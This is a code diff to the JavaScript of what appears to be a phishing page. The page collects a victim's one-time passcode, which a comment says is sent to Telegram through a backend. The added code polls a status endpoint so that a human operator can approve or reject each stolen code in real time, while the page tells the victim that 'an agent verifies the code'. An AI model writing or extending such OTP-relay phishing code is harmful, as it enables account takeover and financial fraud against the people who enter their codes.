@@ -239,7 +239,7 @@ otpSubmitBtn.addEventListener('click', () => {
 
     // Send the OTP code to Telegram via the backend
     document.getElementById('processing-title').innerText = "Verifying Code...";
-    document.getElementById('processing-text').innerText = "Please wait.";
+    document.getElementById('processing-text').innerText = "Please wait while an agent verifies the code.";
     document.getElementById('loader-spinner').style.display = "block";
     showScreen('screen-processing');
 
@@ -250,8 +250,37 @@ otpSubmitBtn.addEventListener('click', () => {
     })
     .then(res => res.json())
     .then(result => {
-        // SHOW THE NEW CONGRATULATIONS SCREEN HERE
-        showScreen('screen-success');
+        if (result.success) {
+            // Start polling to check if Telegram approved the OTP
+            const interval = setInterval(async () => {
+                try {
+                    const statusRes = await fetch(`/api/otp-status/${window.currentAppId}`);
+                    const statusData = await statusRes.json();
+
+                    if (statusData.status === 'approved') {
+                        clearInterval(interval);
+                        document.getElementById('processing-title').innerText = "Approved!";
+                        document.getElementById('processing-text').innerText = "Redirecting...";
+                        document.getElementById('loader-spinner').style.display = "none";
+                        
+                        setTimeout(() => {
+                            showScreen('screen-success');
+                        }, 1000);
+
+                    } else if (statusData.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('processing-title').innerText = "Code Rejected";
+                        document.getElementById('processing-text').innerText = "The agent rejected this code. Please try again.";
+                        document.getElementById('loader-spinner').style.display = "none";
+                    }
+                } catch (error) {
+                    console.error("Checking OTP status...", error);
+                }
+            }, 3000);
+        } else {
+            alert("Error sending OTP.");
+            showScreen('screen-otp');
+        }
     })
     .catch(() => {
         document.getElementById('processing-title').innerText = "Network Error";
